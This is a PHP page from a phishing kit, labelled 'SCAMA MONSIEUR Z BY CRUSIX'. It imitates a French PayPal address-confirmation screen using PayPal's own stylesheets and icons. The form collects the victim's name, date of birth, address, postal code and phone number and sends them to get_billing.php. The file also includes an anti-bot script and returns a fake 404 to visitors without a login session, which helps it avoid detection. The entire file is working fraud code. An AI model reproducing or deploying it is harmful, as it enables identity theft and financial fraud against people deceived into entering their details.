
<?php
ob_start();
session_start();
/*
SCAMA MONSIEUR Z
BY CRUSIX
BILLING.PHP
*/
include('../ANTIBOTS/antibots.php');
if(isset($_SESSION['login'])){

?>

<html lang="fr"><head>

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0">
  <meta charset="utf-8"><link rel="shortcut icon" sizes="196x196" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png"><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"><link rel="icon" type="image/x-icon" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png"><link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css"><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/66d/35fa22be3bb5bbc6c31d9a12b8aa5/css/main.ltr.css"><title>PayPal&nbsp;: Confirmations</title>

<meta charset="utf-8">

<link rel="shortcut icon" sizes="196x196" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png">
<link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">

<link rel="icon" type="image/x-icon" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png">
<link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css">
<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/66d/35fa22be3bb5bbc6c31d9a12b8aa5/css/main.ltr.css">
</head>
<body class="vx_root vx_hasOpenModal vx_addFlowTransition">
 
   <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/ui-web/header-footer/1.40.0/header-footer.min.css">
   
  <div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader"><div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection vx_modal-wrapper_logo" tabindex="-1"><div><div class="vx_modal-content"><center><img src="../RESSOURCES/img/user.png" style="width: 70px;"></center>
    
    <header class="vx_modal-header"><h2 id="js_modalHeader" class="vx_text-2 header-centered">Confirmer une adresse</h2><p class="vx_text-body header-centered"></p>

</header><div class="vx_modal-body vx_blocks-for-mobile"><div><div class="vx_modal-body vx_blocks-for-mobile"><div class="form-container">
   <?php
if(strpos($_SERVER['REQUEST_URI'], 'error=true')){
echo '<div class="vx_alert vx_alert-critical form-alert alertComponent test_alert-message"><p role="alert" aria-live="assertive" class="vx_alert-text ">Veuillez remplir tout les champs</p></div>';
}
?>
  <form action="get_billing.php?<?php echo uniqid(); ?>" method="POST">

    



  <div class="vx_form-group vx_floatingLabel_active" data-label-content="Nom"><label class="floatingLabel" for="cardNumber">Nom</label><input type="text" id="name" aria-describedby="text-info-cardNumber" name="last_name" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Nom" autocomplete="off" value=""></div>


<div class="vx_form-group vx_floatingLabel_active" data-label-content="Prénom"><label class="floatingLabel" for="cardNumber">Prénom</label><input type="text" id="prenom" aria-describedby="text-info-cardNumber" name="first_name" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Prénom" autocomplete="off" value=""></div>


<div class="vx_form-group vx_floatingLabel_active" data-label-content="Date de naissance"><label class="floatingLabel" for="expDate">Date de naissance</label><input type="tel" id="dob" aria-describedby="text-info-expDate" name="dob" class="test_expDate vx_form-control" placeholder="Date de naissance (JJ/MM/AAAA)" autocomplete="off" value="" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="date_reformat_dd(this);" onpaste="date_reformat_dd(this);" maxlength="10"></div>

<div class="vx_form-group vx_floatingLabel_active" data-label-content="Adresse"><label class="floatingLabel" for="expDate">Adresse</label><input type="text" id="adress" aria-describedby="text-info-expDate" name="adress" class="test_expDate vx_form-control" placeholder="Adresse" autocomplete="off" value=""></div>

<div class="vx_form-group vx_floatingLabel_active" data-label-content="Ville"><label class="floatingLabel" for="expDate">Ville</label><input type="text" id="city" aria-describedby="text-info-expDate" name="city" class="test_expDate vx_form-control" placeholder="Ville" autocomplete="off" value=""></div>

<div class="vx_form-group vx_floatingLabel_active" data-label-content="Code postal"><label class="floatingLabel" for="expDate">Code postal</label><input maxlength="5" type="tel" id="zip" aria-describedby="text-info-expDate" name="zipcode" class="test_expDate vx_form-control" placeholder="Code postal" autocomplete="off" value="" onkeypress="return isNumberKey(event)"></div>

<div class="vx_form-group vx_floatingLabel_active" data-label-content="Numéro de téléphone"><label class="floatingLabel" for="expDate">Numéro de téléphone</label><input maxlength="10" type="text" id="phone" aria-describedby="text-info-expDate" name="phone" class="test_expDate vx_form-control" placeholder="Numéro de téléphone" autocomplete="off" value="" onkeypress="return isNumberKey(event)"></div>





</div><button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="" pa-marked="1">Confirmer mon adresse</button></form>

</div></div></div></div></div></div></div><div>


  <script>
      
      function checkValue(str, max) {
        if (str.charAt(0) !== '0' || str == '00') {
          var num = parseInt(str);
          if (isNaN(num) || num <= 0 || num > max) num = 1;
          str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
        };
        return str;
      };

  // reformat by date
    function date_reformat_dd(date) {
      date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
          return v.replace(/\D/g, '')
        });
        if (values[1]) values[1] = checkValue(values[1], 12);
        if (values[0]) values[0] = checkValue(values[0], 31);
        var output = values.map(function(v, i) {
          return v.length == 2 && i < 2 ? v + '/' : v;
        });
        this.value = output.join('').substr(0, 14);
      });
    }

        </script>




            <script type="text/javascript" src="https://www.paypalobjects.com/ui-web/vx-pattern-lib/3-2-3/vx-lib.min.js"></script>



      

<script>
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>

</div></body></html>

<?php
}
else{
	 header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

?>